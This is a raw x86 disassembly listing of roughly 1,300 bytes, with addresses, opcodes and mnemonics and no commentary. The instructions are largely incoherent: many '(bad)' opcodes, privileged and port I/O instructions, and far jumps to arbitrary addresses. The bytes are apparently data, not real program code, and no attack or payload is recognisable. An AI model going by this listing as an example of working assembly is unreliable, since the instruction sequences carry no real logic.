  41d8ba:	outs   dx,DWORD PTR ds:[esi]
  41d8bb:	popf   
  41d8bc:	mov    eax,ds:0xaca95e68
  41d8c1:	pop    ebx
  41d8c2:	stos   BYTE PTR es:[edi],al
  41d8c3:	cdq    
  41d8c4:	sbb    eax,0xd5a0f5f6
  41d8ca:	(bad)  
  41d8cb:	fist   WORD PTR [ecx+edx*1-0x43047731]
  41d8d2:	sub    BYTE PTR [esi],bh
  41d8d4:	inc    esp
  41d8d5:	cmp    BYTE PTR ds:[eax],0x73
  41d8d9:	mov    al,ds:0x608f89b5
  41d8de:	sahf   
  41d8df:	jmp    0x12f6:0x2f458ac9
  41d8e6:	or     edx,eax
  41d8e8:	mov    eax,ds:0xf5b3a555
  41d8ed:	out    0x94,eax
  41d8ef:	jge    0x41d941
  41d8f1:	jg     0x41d8c6
  41d8f3:	xor    al,0xf7
  41d8f5:	lahf   
  41d8f6:	scas   al,BYTE PTR es:[edi]
  41d8f7:	or     DWORD PTR [ecx+0x3c9b033b],0xd5e8a4dc
  41d901:	pop    ds
  41d902:	gs xchg ebx,eax
  41d904:	nop
  41d905:	jp     0x41d973
  41d907:	scas   al,BYTE PTR es:[edi]
  41d908:	icebp  
  41d909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d90a:	mov    bl,0xf5
  41d90c:	or     cl,BYTE PTR cs:[ebx+0x7f]
  41d910:	pop    ds
  41d911:	fs (bad) 
  41d913:	(bad)  
  41d915:	sub    bh,dh
  41d917:	jp     0x41d969
  41d919:	push   cs
  41d91a:	shr    DWORD PTR [esi-0x46],0x70
  41d91e:	popa   
  41d91f:	addr16 mov dl,0xd2
  41d922:	lock add eax,0x37ec1894
  41d928:	ins    BYTE PTR es:[edi],dx
  41d929:	xchg   esi,eax
  41d92a:	(bad)  
  41d92b:	lock popa 
  41d92d:	mov    BYTE PTR [esi+0x4d7f87d3],bl
  41d933:	ja     0x41d90a
  41d935:	addr16 mov al,ds:0xd3d6
  41d939:	fadd   QWORD PTR [edi+0x69267636]
  41d93f:	pop    ebx
  41d940:	sbb    al,0x3a
  41d942:	imul   edi,DWORD PTR [eax+eax*1-0x2e],0xb12a6bbe
  41d94a:	out    dx,al
  41d94b:	outs   dx,BYTE PTR ds:[esi]
  41d94c:	addr16 out dx,al
  41d94e:	sbb    al,0x9
  41d950:	sbb    ah,dl
  41d952:	mov    esp,0x7eff90a4
  41d957:	cmp    DWORD PTR [ebx+ebx*1],esi
  41d95a:	jg     0x41d8f8
  41d95c:	dec    eax
  41d95d:	dec    esi
  41d95e:	and    al,BYTE PTR [edx]
  41d960:	jmp    0x4a90:0x86dd264e
  41d967:	pop    ss
  41d968:	into   
  41d969:	rcl    ecx,0x96
  41d96c:	aas    
  41d96d:	fsub   QWORD PTR [edi]
  41d96f:	in     eax,dx
  41d970:	and    cl,BYTE PTR [esi-0x43]
  41d973:	and    BYTE PTR [edx+ebx*1],al
  41d976:	push   0x7c573192
  41d97b:	inc    ebp
  41d97c:	outs   dx,BYTE PTR ds:[esi]
  41d97d:	inc    edx
  41d97e:	inc    edx
  41d97f:	mov    ecx,0xa590c29c
  41d984:	push   0x9be43f4d
  41d989:	adc    ebp,DWORD PTR [edx+0x13c04dcc]
  41d98f:	sbb    BYTE PTR ds:0x77de,dh
  41d994:	and    DWORD PTR [eax+0x3b3872be],esp
  41d99a:	or     eax,0xd1c2f0cc
  41d99f:	pop    esp
  41d9a0:	div    ebp
  41d9a2:	ror    eax,0x63
  41d9a5:	call   esi
  41d9a7:	mov    ch,0x41
  41d9a9:	xor    al,0xf8
  41d9ab:	push   eax
  41d9ac:	gs or  eax,0x1ad1ffda
  41d9b2:	jecxz  0x41d949
  41d9b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9b5:	sbb    BYTE PTR [ecx],ah
  41d9b7:	(bad)  
  41d9b8:	js     0x41d993
  41d9ba:	dec    ebx
  41d9bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9bc:	push   cs
  41d9bd:	ret    0x6992
  41d9c0:	jmp    0xb862ed4e
  41d9c5:	mov    DWORD PTR [edi+edx*1],eax
  41d9c8:	xor    eax,0x5964f3d6
  41d9cd:	push   edx
  41d9ce:	mov    edx,0x3ffc1a29
  41d9d3:	(bad)  
  41d9d4:	nop
  41d9d5:	fnop   
  41d9d7:	lds    ebp,FWORD PTR [esi+0x7c]
  41d9da:	cmp    esi,edx
  41d9dc:	jnp    0x41d9b5
  41d9de:	and    eax,0x1f530ffb
  41d9e3:	iret   
  41d9e4:	shr    DWORD PTR [edx+0x67],0xc4
  41d9e8:	inc    eax
  41d9e9:	jae    0x41d97e
  41d9eb:	int3   
  41d9ec:	jge    0x41d9c3
  41d9ee:	cmp    BYTE PTR [ecx-0x6b],dl
  41d9f1:	je     0x41d9f5
  41d9f3:	clc    
  41d9f4:	and    DWORD PTR fs:0xae9da64a,ecx
  41d9fb:	jg     0x41da10
  41d9fd:	cld    
  41d9fe:	jg     0x41da01
  41da00:	addr16 xchg edx,eax
  41da02:	mov    edx,0xaeeb927d
  41da07:	inc    ecx
  41da08:	(bad)  
  41da0a:	cs fwait
  41da0c:	push   ebx
  41da0d:	push   0xffffff9f
  41da0f:	and    al,0xb3
  41da11:	shr    BYTE PTR [ecx+0x57],0xd9
  41da15:	push   edx
  41da16:	pop    ecx
  41da17:	int    0x8a
  41da19:	dec    ebx
  41da1a:	sub    al,0xd5
  41da1c:	repz das 
  41da1e:	(bad)  
  41da1f:	cmp    DWORD PTR [ebp+ecx*8+0x55a2a6a3],ecx
  41da26:	sbb    eax,0xc27ce882
  41da2b:	sbb    al,0x12
  41da2d:	test   al,0x38
  41da2f:	imul   DWORD PTR [esi]
  41da31:	std    
  41da32:	inc    esi
  41da33:	int    0x9b
  41da35:	mov    BYTE PTR [esi+0x48a7df55],0xcf
  41da3c:	jnp    0x41da10
  41da3e:	test   eax,0xac7dfcdc
  41da43:	not    DWORD PTR ds:0xf4179fbc
  41da49:	ja     0x41da4a
  41da4b:	stc    
  41da4c:	add    DWORD PTR [edx-0x28],esi
  41da4f:	hlt    
  41da50:	cmc    
  41da51:	xchg   esi,eax
  41da52:	test   eax,0xfdaae3fa
  41da57:	mov    dh,0xc
  41da59:	test   eax,0xb1e307a2
  41da5e:	fdecstp 
  41da60:	mov    WORD PTR [ebx+0x782c2c46],ss
  41da66:	jnp    0x41d9f0
  41da68:	and    esi,DWORD PTR [ebp+esi*8-0x3f]
  41da6c:	iret   
  41da6d:	mov    bl,BYTE PTR [eax+ecx*4]
  41da70:	jg     0x41daa7
  41da72:	rcl    al,cl
  41da74:	hlt    
  41da75:	mov    ecx,ebp
  41da77:	cmp    esi,DWORD PTR [edx]
  41da79:	mov    dh,0xed
  41da7b:	xchg   BYTE PTR [eax-0x3684c659],dl
  41da81:	or     esp,eax
  41da83:	mov    ebx,0x2dc8855
  41da88:	pop    ecx
  41da89:	pushf  
  41da8a:	repnz add eax,0x9feb11bf
  41da90:	sbb    ecx,DWORD PTR [ebp-0x7444727d]
  41da96:	xor    bl,BYTE PTR [edi]
  41da98:	repz or BYTE PTR [edx-0x4a],dh
  41da9c:	(bad)  
  41da9d:	push   ecx
  41da9e:	cwde   
  41da9f:	pushf  
  41daa0:	mov    esp,DWORD PTR [edx+edi*1]
  41daa3:	pop    esi
  41daa4:	mov    bl,0x88
  41daa6:	stos   DWORD PTR es:[edi],eax
  41daa7:	in     al,dx
  41daa8:	enter  0x2ad7,0xf
  41daac:	imul   edi,ebp,0x2c1db32d
  41dab2:	test   bh,bl
  41dab4:	jl     0x41da87
  41dab6:	and    al,BYTE PTR [eax+0x4c]
  41dab9:	mov    al,0x10
  41dabb:	out    dx,al
  41dabc:	mov    ds:0x621ad86a,eax
  41dac1:	in     eax,dx
  41dac2:	icebp  
  41dac3:	mov    WORD PTR [ebx],fs
  41dac5:	sub    eax,edi
  41dac7:	ds ret 0x1692
  41dacb:	ret    
  41dacc:	dec    esi
  41dacd:	xchg   ebp,eax
  41dace:	into   
  41dacf:	(bad)  
  41dad0:	push   ebx
  41dad1:	and    ebp,DWORD PTR [ebx]
  41dad3:	jo     0x41da56
  41dad5:	mov    ch,BYTE PTR [ecx+0x7]
  41dad8:	jmp    FWORD PTR [ebp+0x2c882531]
  41dade:	dec    edx
  41dadf:	cdq    
  41dae0:	jmp    0xc61ff98a
  41dae5:	sbb    eax,0x674b6eaf
  41daea:	xchg   ecx,eax
  41daeb:	in     eax,0x25
  41daed:	lods   al,BYTE PTR ds:[esi]
  41daee:	loope  0x41dab7
  41daf0:	push   0xffffffd0
  41daf2:	(bad)  
  41daf3:	aam    0xd6
  41daf5:	(bad)  
  41daf6:	in     eax,dx
  41daf7:	out    0xbb,al
  41daf9:	cmp    ebx,DWORD PTR [eax-0x67f12cb0]
  41daff:	xchg   DWORD PTR [eax+0x7c3708e4],edi
  41db05:	ret    
  41db06:	(bad)  
  41db07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db09:	inc    ecx
  41db0a:	dec    ebp
  41db0b:	dec    ecx
  41db0c:	loope  0x41daa7
  41db0e:	pop    ds
  41db0f:	push   cs
  41db10:	sbb    al,0xaa
  41db12:	mov    ?,esp
  41db14:	jo     0x41daa1
  41db16:	retf   0x6c2a
  41db19:	mov    edi,0x334c37ca
  41db1e:	shl    BYTE PTR [edx-0x9971b6],0x73
  41db25:	int3   
  41db26:	inc    esp
  41db27:	aas    
  41db28:	jp     0x41dac4
  41db2a:	xchg   esi,eax
  41db2b:	dec    edi
  41db2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db2d:	shl    ebp,0xaf
  41db30:	add    ebx,ecx
  41db32:	or     al,cl
  41db34:	pop    ss
  41db35:	adc    ebp,DWORD PTR [edi-0x2cc8e778]
  41db3b:	sub    dl,ch
  41db3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db3e:	mov    ds:0x714d1818,al
  41db43:	aam    0x3b
  41db45:	push   ebp
  41db46:	(bad)  
  41db47:	data16 fisubr DWORD PTR ss:[esp+esi*8-0x36]
  41db4d:	repnz push cs
  41db4f:	add    eax,0xffe1b88d
  41db54:	loope  0x41db80
  41db56:	dec    ecx
  41db57:	jmp    0x41db57
  41db59:	push   cs
  41db5a:	pop    es
  41db5b:	adc    ah,al
  41db5d:	pop    esi
  41db5e:	adc    eax,0x51ed7a01
  41db63:	shr    DWORD PTR [ecx],1
  41db65:	rcl    BYTE PTR [eax-0x48],1
  41db68:	data16 lods al,BYTE PTR ds:[esi]
  41db6a:	mov    bh,0xb5
  41db6c:	in     eax,dx
  41db6d:	xchg   edi,eax
  41db6e:	lods   eax,DWORD PTR ds:[esi]
  41db6f:	xor    BYTE PTR [edi+0x15],bl
  41db72:	mov    ch,0x1f
  41db74:	mov    esp,ss
  41db76:	in     al,0xea
  41db78:	test   eax,0x415c67
  41db7d:	dec    edx
  41db7e:	push   esp
  41db7f:	inc    esi
  41db80:	mov    DWORD PTR [edi+0x12],esi
  41db83:	imul   esi,DWORD PTR [ebp+edx*2+0x58f4f1bf],0xe89ddbbe
  41db8e:	push   es
  41db8f:	je     0x41dc03
  41db91:	push   eax
  41db92:	cmp    DWORD PTR ds:0x1713b42b,esi
  41db98:	sub    edx,eax
  41db9a:	xor    al,0x16
  41db9c:	push   esp
  41db9d:	int3   
  41db9e:	mov    ebp,0xcb9c5bcd
  41dba3:	pusha  
  41dba4:	(bad)  
  41dba5:	sar    eax,1
  41dba7:	mov    DWORD PTR [ecx],0x847db72d
  41dbad:	aas    
  41dbae:	popa   
  41dbaf:	xor    BYTE PTR [ebp+edx*4-0x1d],ch
  41dbb3:	adc    eax,0x107c768c
  41dbb8:	test   BYTE PTR [eax-0x108e03a4],ah
  41dbbe:	cwde   
  41dbbf:	push   edx
  41dbc0:	xchg   DWORD PTR [ebx+0x0],edx
  41dbc3:	int    0x49
  41dbc5:	fcmovnb st,st(2)
  41dbc7:	mov    cs:0xd76ca254,al
  41dbcd:	cmp    eax,0x19f7618c
  41dbd2:	addr16 hlt 
  41dbd4:	ror    edx,1
  41dbd6:	stc    
  41dbd7:	adc    BYTE PTR [ebp+0x47b2bad7],bl
  41dbdd:	adc    bh,BYTE PTR [ecx]
  41dbdf:	pop    edi
  41dbe0:	jp     0x41dbbb
  41dbe2:	pop    ecx
  41dbe3:	push   ecx
  41dbe4:	adc    al,0x6a
  41dbe6:	cmp    esi,ebp
  41dbe8:	add    DWORD PTR [eax-0x7e],0xffffffca
  41dbec:	pop    esi
  41dbed:	jae    0x41dc0f
  41dbef:	xor    ebp,DWORD PTR [ecx]
  41dbf1:	mov    esi,ebx
  41dbf3:	arpl   WORD PTR [esi],ax
  41dbf5:	lds    ecx,FWORD PTR [ebp-0x27]
  41dbf8:	out    dx,eax
  41dbf9:	scas   al,BYTE PTR es:[edi]
  41dbfa:	add    DWORD PTR [ebx+0x54f15e],ebx
  41dc00:	mov    ebp,0xfd159c90
  41dc05:	jp     0x41dc26
  41dc07:	icebp  
  41dc08:	scas   al,BYTE PTR es:[edi]
  41dc09:	retfw  0x96db
  41dc0d:	adc    BYTE PTR [edi-0x4d],dh
  41dc10:	cdq    
  41dc11:	loope  0x41dc16
  41dc13:	jle    0x41dbbd
  41dc15:	dec    edx
  41dc16:	out    dx,eax
  41dc17:	mov    ds,WORD PTR [edi+0x28]
  41dc1a:	mov    edx,0x7465f06d
  41dc1f:	in     al,0x2f
  41dc21:	add    ebp,DWORD PTR [ecx+0x18]
  41dc24:	test   al,0x7c
  41dc26:	mov    esp,0xbe206cd0
  41dc2b:	add    bl,dl
  41dc2d:	cli    
  41dc2e:	mov    dh,0x32
  41dc30:	mov    ds:0xe2bb5bf8,eax
  41dc35:	xchg   cl,ah
  41dc37:	adc    al,BYTE PTR [edi+0x2d]
  41dc3a:	mov    ebx,DWORD PTR [eax]
  41dc3c:	jp     0x41dcad
  41dc3e:	ret    0x886b
  41dc41:	into   
  41dc42:	or     DWORD PTR [edi],ebp
  41dc44:	aam    0x9
  41dc46:	or     DWORD PTR [ecx+0x2b],edx
  41dc49:	mov    ah,0x25
  41dc4b:	xor    DWORD PTR ds:0x7063cdd2,ecx
  41dc51:	add    BYTE PTR [edx+0x4e7b2515],cl
  41dc57:	jl     0x41dbf8
  41dc59:	push   ebp
  41dc5a:	scas   al,BYTE PTR es:[edi]
  41dc5b:	mov    al,ds:0xc240ca0e
  41dc60:	scas   eax,DWORD PTR es:[edi]
  41dc61:	std    
  41dc62:	jns    0x41dcd4
  41dc64:	and    al,0xd4
  41dc66:	jb     0x41dc05
  41dc68:	mov    ds:0x38af61f7,eax
  41dc6d:	mov    ebp,0xd7324409
  41dc72:	jns    0x41dc85
  41dc74:	je     0x41dcab
  41dc76:	fsub   QWORD PTR [edi+0x21407a1f]
  41dc7c:	jecxz  0x41dcd7
  41dc7e:	cwde   
  41dc7f:	mov    ebx,0xdd2c1738
  41dc84:	sbb    eax,0xb9ae5a67
  41dc89:	push   edi
  41dc8a:	push   0x7654f6e4
  41dc8f:	daa    
  41dc90:	fidiv  WORD PTR [esi+0xf]
  41dc93:	das    
  41dc94:	sti    
  41dc95:	inc    ecx
  41dc96:	jg     0x41dced
  41dc98:	inc    esp
  41dc99:	daa    
  41dc9a:	je     0x41dc68
  41dc9c:	fist   DWORD PTR [esi-0x12]
  41dc9f:	ins    BYTE PTR es:[edi],dx
  41dca0:	cmp    al,0x1e
  41dca2:	add    bl,BYTE PTR [edi+0x33]
  41dca5:	xchg   ecx,eax
  41dca6:	or     al,0xe6
  41dca8:	or     DWORD PTR [edi],ebx
  41dcaa:	mov    ds,WORD PTR [edx+0x3e5fd04]
  41dcb0:	sar    BYTE PTR ds:0x7abe3b89,cl
  41dcb6:	mov    eax,0xef08d81a
  41dcbb:	icebp  
  41dcbc:	fidiv  DWORD PTR [ecx+0x15]
  41dcbf:	pop    esp
  41dcc0:	test   eax,0x5465b8da
  41dcc5:	mov    BYTE PTR [edx],ch
  41dcc7:	ficomp DWORD PTR [edi+esi*4-0x6a723ba7]
  41dcce:	enter  0xd92,0x9f
  41dcd2:	les    ecx,FWORD PTR [ebp-0x668fad25]
  41dcd8:	cmp    al,BYTE PTR [edx+0x79]
  41dcdb:	mov    edi,0x1e090e15
  41dce0:	lea    edi,[edx-0x52023497]
  41dce6:	test   DWORD PTR [ecx],esi
  41dce8:	add    al,0x0
  41dcea:	sbb    edi,DWORD PTR [ebp-0x796d3260]
  41dcf0:	cmp    al,0x39
  41dcf2:	add    BYTE PTR [esi+edi*2+0x6ee31629],0x79
  41dcfa:	mov    ecx,0x8b5ea7ba
  41dcff:	stc    
  41dd00:	sub    esp,DWORD PTR [edx]
  41dd02:	retf   
  41dd03:	pop    es
  41dd04:	sub    DWORD PTR [ecx+0x5d],eax
  41dd07:	adc    dh,al
  41dd09:	pop    ss
  41dd0a:	xlat   BYTE PTR ds:[ebx]
  41dd0b:	pop    esi
  41dd0c:	mov    ah,dl
  41dd0e:	aam    0x78
  41dd10:	loopne 0x41dc97
  41dd12:	ss adc eax,0x86a57f04
  41dd18:	mov    ebp,ds
  41dd1a:	cmp    ebp,edi
  41dd1c:	push   edx
  41dd1d:	mov    edx,0xb16630c1
  41dd22:	repz xor eax,0x18ea34c9
  41dd28:	mov    esp,0x7b50ddb4
  41dd2d:	add    bl,cl
  41dd2f:	pushf  
  41dd30:	lods   eax,DWORD PTR ds:[esi]
  41dd31:	push   0x0
  41dd33:	arpl   WORD PTR [edi-0x5bd30701],ax
  41dd39:	dec    edx
  41dd3a:	stc    
  41dd3b:	mov    eax,ds:0xe9213187
  41dd40:	test   DWORD PTR [eax],eax
  41dd42:	fidivr WORD PTR [eax-0x36]
  41dd45:	jmp    0xbf7f:0xce7a9a87
  41dd4c:	jnp    0x41dd70
  41dd4e:	and    BYTE PTR [esi+0xd],dl
  41dd51:	ds or  al,0xf1
  41dd54:	not    BYTE PTR [esi-0x75]
  41dd57:	sbb    eax,0x7ed05c5d
  41dd5c:	adc    eax,0x125e6317
  41dd61:	push   ebx
  41dd62:	and    DWORD PTR [edi],ebp
  41dd64:	fld    DWORD PTR ss:[eax+0x722654a1]
  41dd6b:	daa    
  41dd6c:	(bad)  
  41dd6d:	(bad)  
  41dd6e:	push   0x2c
  41dd70:	sti    
  41dd71:	adc    ecx,DWORD PTR [ebp+0x4a60126c]
  41dd77:	xor    bl,0x86
  41dd7a:	bound  ebx,QWORD PTR [edx+ebx*2]
  41dd7d:	fmul   st,st(4)
  41dd7f:	dec    edx
  41dd80:	jmp    0x3092d9c2
  41dd85:	mov    ebx,?
  41dd87:	fwait
  41dd88:	das    
  41dd89:	pop    ecx
  41dd8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd8b:	push   esi
  41dd8c:	ja     0x41dd99
  41dd8e:	mov    eax,ds:0x1dfc4e0f
  41dd93:	cwde   
  41dd94:	cmp    eax,0x80260579
  41dd99:	enter  0x553c,0xe9
  41dd9d:	test   DWORD PTR ds:0xdbacdc8,ecx
  41dda3:	xchg   ecx,ebx
  41dda5:	fmul   st(4),st
  41dda7:	mov    cs,WORD PTR [eax-0x5f]
  41ddaa:	or     dh,BYTE PTR [ebx+ecx*1]
  41ddad:	aas    
  41ddae:	mov    ds:0x72d09de7,al
  41ddb3:	inc    edx
  41ddb4:	pop    esi
  41ddb5:	hlt    
  41ddb6:	xor    al,cl
  41ddb8:	xchg   ebp,eax
  41ddb9:	js     0x41ddc0
  41ddbb:	push   esp
  41ddbc:	inc    edx
  41ddbd:	xor    DWORD PTR [edx],ebp
  41ddbf:	cld    
  41ddc0:	clc    
  41ddc1:	push   eax
  41ddc2:	cld    
  41ddc3:	in     al,0x74
  41ddc5:	adc    al,0xd3
  41ddc7:	in     al,dx
  41ddc8:	in     al,0x5b
  41ddca:	(bad)  
  41ddcb:	fild   QWORD PTR [ebx]
  41ddcd:	xchg   BYTE PTR [esi+0x7ebb3f1f],bl
  41ddd3:	mov    ah,0x30
  41ddd5:	sub    al,0xa4
  41ddd7:	sub    DWORD PTR [eax+eiz*8-0x55d0bfc9],esi
  41ddde:	pop    ebp
  41dddf:	mov    eax,0xa5449a8e
  41dde4:	(bad)  
  41dde5:	jg     0x41ddec
  41dde7:	add    dh,cl
  41dde9:	pop    esi
  41ddea:	in     eax,dx
  41ddeb:	inc    eax
  41ddec:	inc    edi
  41dded:	fwait
  41ddee:	jnp    0x41dde6
  41ddf0:	jae    0x41de4a
  41ddf2:	pop    edx
  41ddf3:	pop    edi
  41ddf4:	mov    dl,0xa
  41ddf6:	pop    edi
  41ddf7:	dec    ebp
  41ddf8:	dec    esp
  41ddf9:	jmp    0x41ddb1
  41ddfb:	push   esi
  41ddfc:	rol    BYTE PTR [edx],1
  41ddfe:	push   ecx
  41ddff:	fiadd  WORD PTR [ecx]
  41de01:	gs jo  0x41ddcd
  41de04:	or     eax,0x275214ea
  41de09:	ja     0x41de1e
  41de0b:	test   DWORD PTR [ebx],esi
  41de0d:	push   cs
  41de0e:	enter  0xc67f,0xa3
  41de12:	gs dec ecx
  41de14:	xlat   BYTE PTR ds:[ebx]
  41de15:	fisttp WORD PTR [ebx]
  41de17:	push   edi
  41de18:	outs   dx,DWORD PTR ds:[esi]
  41de19:	push   eax
  41de1a:	loopne 0x41de04
  41de1c:	(bad)  
  41de1e:	adc    eax,0x5dba9c45
  41de23:	mov    DWORD PTR es:[ebx-0x58],esi
  41de27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de28:	enter  0xe088,0xcf
  41de2c:	push   esp
  41de2d:	jl     0x41de19
  41de2f:	sub    edx,ecx
  41de31:	idiv   bh
  41de33:	sub    BYTE PTR [di+0x15],0x27
  41de38:	cmc    
  41de39:	xor    edi,edi
  41de3b:	cdq    
  41de3c:	sbb    DWORD PTR [ecx+0xf],edi
  41de3f:	rcl    DWORD PTR [edx-0x3d],cl
  41de42:	or     esp,DWORD PTR [ebx+0x33]
  41de45:	mov    al,ds:0x2037bcac
  41de4a:	adc    eax,0x20feec37
  41de4f:	retf   0x295f
  41de52:	inc    ebx
  41de53:	xchg   edx,eax
  41de54:	sub    dh,BYTE PTR [esi+0x49423a14]
  41de5a:	add    al,0xa6
  41de5c:	and    esi,DWORD PTR [ebx+0x654aeb7b]
  41de62:	push   esp
  41de63:	sub    DWORD PTR [eax-0x765cbfc0],ebx
  41de69:	jmp    0xa37827b0
  41de6e:	mov    ebx,0x1804ec49
  41de73:	fisubr DWORD PTR [edx-0x1c4060ea]
  41de79:	sub    BYTE PTR [ebp+0x4d],bh
  41de7c:	xchg   ebp,eax
  41de7d:	(bad)  
  41de7e:	stc    
  41de7f:	lods   al,BYTE PTR ds:[esi]
  41de80:	shl    DWORD PTR [edx-0x534be366],cl
  41de86:	icebp  
  41de87:	mov    bh,0x10
  41de89:	xor    bl,ch
  41de8b:	test   DWORD PTR [edi],ebx
  41de8d:	shl    ebx,0x29
  41de90:	test   al,0x64
  41de92:	popf   
  41de93:	mov    ebx,0x11095b1e
  41de98:	and    ebp,DWORD PTR [ebx-0x80]
  41de9b:	jg     0x41de5f
  41de9d:	pop    edx
  41de9e:	pop    ecx
  41de9f:	xchg   ebx,eax
  41dea0:	stc    
  41dea1:	jmp    0x41dead
  41dea3:	in     eax,dx
  41dea4:	pop    ds
  41dea5:	jmp    0xfae:0xfb01792c
  41deac:	test   DWORD PTR [ecx-0x61],edi
  41deaf:	xor    esp,DWORD PTR [eax+0x7e]
  41deb2:	pushf  
  41deb3:	gs and eax,0x3d37c444
  41deb9:	loop   0x41dec7
  41debb:	nop
  41debc:	inc    ebx
  41debd:	(bad)  
  41debf:	fsubp  st(5),st
  41dec1:	sub    bh,BYTE PTR [ebx+0xf]
  41dec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dec5:	jecxz  0x41ded5
  41dec7:	or     dh,BYTE PTR [ebx]
  41dec9:	pop    edi
  41deca:	push   ds
  41decb:	sub    eax,0xdf93caf3
  41ded0:	dec    eax
  41ded1:	loopne 0x41df09
  41ded3:	idiv   DWORD PTR [ebp+0x2b9e0cde]
  41ded9:	mov    ebp,DWORD PTR [ebp-0x5260b132]
  41dedf:	scas   al,BYTE PTR es:[edi]
  41dee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dee1:	arpl   dx,bp
  41dee3:	sub    DWORD PTR [esi-0x1cd13455],esp
  41dee9:	fist   WORD PTR [ecx]
  41deeb:	stos   BYTE PTR es:[edi],al
  41deec:	les    ebp,FWORD PTR [ebp-0x67e9911d]
  41def2:	fcomip st,st(5)
  41def4:	jge    0x41df29
  41def6:	sbb    eax,0xa880fafa
  41defb:	icebp  
  41defc:	adc    al,0x8
  41defe:	mov    DWORD PTR [edi+0x5f],ecx
  41df01:	ret    0x197b
  41df04:	push   ebp
  41df05:	shl    ebx,1
  41df07:	cmp    DWORD PTR [ebx+0x4c24be37],esi
  41df0d:	aad    0x93
  41df0f:	mov    WORD PTR [eax],cs
  41df11:	(bad)  
  41df12:	in     eax,0x57
  41df14:	test   DWORD PTR [esp+ebp*2+0x5e804da0],ebx
  41df1b:	pop    ecx
  41df1c:	mov    dh,0x7a
  41df1e:	mov    ch,al
  41df20:	out    dx,eax
  41df21:	jg     0x41df25
  41df23:	cmp    eax,0x1ce0d84f
  41df28:	mov    al,ds:0xc7cba2b6
  41df2d:	pop    ss
  41df2e:	ret    0x1ad9
  41df31:	iret   
  41df32:	retf   
  41df33:	aad    0x37
  41df35:	cmc    
  41df36:	cli    
  41df37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df38:	ins    BYTE PTR es:[edi],dx
  41df39:	ins    BYTE PTR es:[edi],dx
  41df3a:	and    dl,cl
  41df3c:	pop    esp
  41df3d:	sbb    BYTE PTR [eax-0x5252f9f6],cl
  41df43:	mov    ch,0x58
  41df45:	inc    esp
  41df46:	mov    cl,0xab
  41df48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df49:	mov    ebp,0xcf6ae554
  41df4e:	jbe    0x41df16
  41df50:	add    eax,0x918e1cfe
  41df55:	fdivrp st(0),st
  41df57:	add    eax,0x76003bd8
  41df5c:	pop    ebx
  41df5d:	sar    BYTE PTR [edx],0x5
  41df60:	push   eax
  41df61:	gs std 
  41df63:	cli    
  41df64:	les    esi,FWORD PTR [ebx+0x65c488ef]
  41df6a:	sar    edx,1
  41df6c:	sub    BYTE PTR [ecx+0x14beee57],dl
  41df72:	jg     0x41dfed
  41df74:	jo     0x41df5b
  41df76:	cmc    
  41df77:	out    dx,al
  41df78:	cmp    dh,BYTE PTR [eax+0x452c6694]
  41df7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df7f:	arpl   WORD PTR [esp+ebx*1],di
  41df82:	fadd   DWORD PTR [eax+ebp*4-0x70a8ff39]
  41df89:	pop    ds
  41df8a:	jmp    0x9a42:0x73e1f8aa
  41df91:	pop    edx
  41df92:	clc    
  41df93:	call   0x9dfb:0x443e14d9
  41df9a:	adc    al,BYTE PTR [ebx]
  41df9c:	mov    DWORD PTR [esi+0xc],ecx
  41df9f:	mov    ecx,0x6554407a
  41dfa4:	xchg   bh,bl
  41dfa6:	xor    BYTE PTR [edx+0x19f287a6],al
  41dfac:	cwde   
  41dfad:	enter  0x8783,0xc5
  41dfb1:	push   edx
  41dfb2:	ins    BYTE PTR es:[edi],dx
  41dfb3:	out    0x8,eax
  41dfb5:	and    al,0xe2
  41dfb7:	and    DWORD PTR [ebp-0x5caa54ab],0xffffffc4
  41dfbe:	(bad)  
  41dfbf:	imul   eax,DWORD PTR [ecx+0x2d7f53fd],0x5fc4b651
  41dfc9:	iret   
  41dfca:	push   ss
  41dfcb:	sub    eax,0x76e74d0e
  41dfd0:	xchg   edi,eax
  41dfd1:	mov    cl,0xd9
  41dfd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfd4:	and    ebx,DWORD PTR [ebp-0x251588b0]
  41dfda:	sub    esp,DWORD PTR [ebp-0x1976792e]
  41dfe0:	sbb    BYTE PTR [eax],0x1f
  41dfe3:	cld    
  41dfe4:	aaa    
  41dfe5:	cmp    BYTE PTR [esp+ebx*4],al
  41dfe8:	xchg   ebp,eax
  41dfe9:	stos   BYTE PTR es:[edi],al
  41dfea:	inc    esp
  41dfeb:	loopne 0x41e050
  41dfed:	mov    dh,0x42
  41dfef:	xchg   ecx,eax
  41dff0:	sbb    dl,cl
  41dff2:	enter  0x5e1f,0x8b
  41dff6:	nop
  41dff7:	(bad)  [edx-0x51]
  41dffa:	sub    eax,0x875cfecb
  41dfff:	inc    esp
  41e000:	adc    al,0x2d
  41e002:	lods   al,BYTE PTR ds:[esi]
  41e003:	xor    dl,BYTE PTR [di-0x6f]
  41e007:	test   BYTE PTR [ecx+0x65],0xf8
  41e00b:	jb     0x41dfb0
  41e00d:	mov    ds:0x3508d010,eax
  41e012:	jmp    0x1c1b:0x11517c4b
  41e019:	xor    dl,BYTE PTR [edi]
  41e01b:	lahf   
  41e01c:	or     al,0xf2
  41e01e:	mov    WORD PTR [edi],?
  41e020:	or     ah,dh
  41e022:	mov    BYTE PTR [ebp-0x63e3c852],dh
  41e028:	mov    WORD PTR [ecx+0x2d],cs
  41e02b:	dec    esi
  41e02c:	jae    0x41e073
  41e02e:	aas    
  41e02f:	inc    ebx
  41e030:	xchg   ecx,eax
  41e031:	popf   
  41e032:	sub    DWORD PTR [ecx+eiz*4-0x4],0xe2c8711c
  41e03a:	into   
  41e03b:	retf   0x4c92
  41e03e:	or     ecx,ebx
